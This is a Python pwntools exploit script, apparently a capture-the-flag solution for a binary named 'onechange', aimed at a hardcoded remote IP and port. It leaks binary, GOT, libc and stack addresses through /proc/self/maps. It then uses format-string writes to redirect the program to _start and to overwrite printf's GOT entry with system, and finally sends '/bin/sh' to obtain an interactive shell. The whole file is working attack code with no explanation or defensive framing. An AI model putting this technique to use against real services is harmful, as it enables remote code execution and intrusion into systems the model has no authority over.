from pwn import *
def twoLowBytes(addr):
	return addr&0xffff
def getByteAtIndex(addr,index):
	return (addr>>((index-1)*8))&0xff
debug = 0
if debug:
	s = process('./onechange')
	raw_input() 
	s.sendlineafter("One change to do something right !!",'/proc/self/maps')
	system_offset = 0x453a0
else:
	s = remote('103.237.99.35', 28995)
	s.sendlineafter("One change to do something right !!",'/proc/self/maps')
	system_offset = 0x046590

# ------------- recv libc, bin, got base ----------------
print s.recvline()
print s.recvline()
bin_base = s.recv(12)
bin_base = int('0x'+bin_base,16)
log.info("bin_base : 0x%x"%bin_base)

s.recvline()
s.recvline()

got_base = s.recv(12)
got_base = int('0x'+got_base,16)
log.info("got_base : 0x%x"%got_base)

s.recvuntil("[heap]")
s.recvuntil("\n")
libc_base = s.recv(12)
libc_base = int('0x'+libc_base,16)
log.info("libc_base: 0x%x"%libc_base)

if debug==0:
	for i in range(0,15):
		resp = s.recvline()
	stack = s.recv(12)
else:
	for i in range(0,10):
		resp = s.recvline()
	stack = s.recv(12)
#---------------calc address use in exploit---------------
stack = int('0x'+stack,16)
log.info("stack: 0x%x"%stack)
_start = bin_base + 0x8b0
main = bin_base+0x9ba #0x9c5 
log.info("main: 0x%x"%main)
tmp_fini_call = bin_base + 0x2020c0-0x201df0
log.info("tmp_fini_call: 0x%x"%tmp_fini_call)
printf_got = got_base+0x38
#------------- send data ----------------

s.sendlineafter("you right now input a number ?","2")
'''
s.sendline("%42$p")
'''
offset = 0x18
payload = "%"+str(twoLowBytes(tmp_fini_call+100)+offset)+"x"
payload += "%42$hn"
payload = payload.ljust(offset,'a')
payload += p64(_start)
s.sendline(payload)



# --------------hmmmm exploit-----------------
system = libc_base+system_offset
filename = '/proc/self/mapss\x00'
filename = filename.ljust(24,'\x00')
filename += p64(printf_got)
filename += p64(printf_got+2)

s.sendlineafter("One change to do something right !!",filename)
s.sendlineafter("you right now input a number ?","3")
thirdByte = getByteAtIndex(system,3)
payload = '%'+str(thirdByte)+'x%12$hhn'
payload += '%'+str(twoLowBytes(system)-thirdByte)+'x%11$hn'
s.sendline(payload)
s.sendline('/bin/sh\x00')

s.interactive()
s.close()

'''
s.sendlineafter("you right now input a number ?","2")
# ----send to leak libc-----
s.sendline("libc_end:%25$p, dl_init+139:%43$p")
s.recvuntil("libc_end:")
libc_end = int(s.recv(14),16)
log.info("libc_end: 0x%x"%libc_end)
s.recvuntil("dl_init+139:")
dl_init = int(s.recv(14),16)-139
log.info("dl_init: 0x%x"%dl_init)
'''


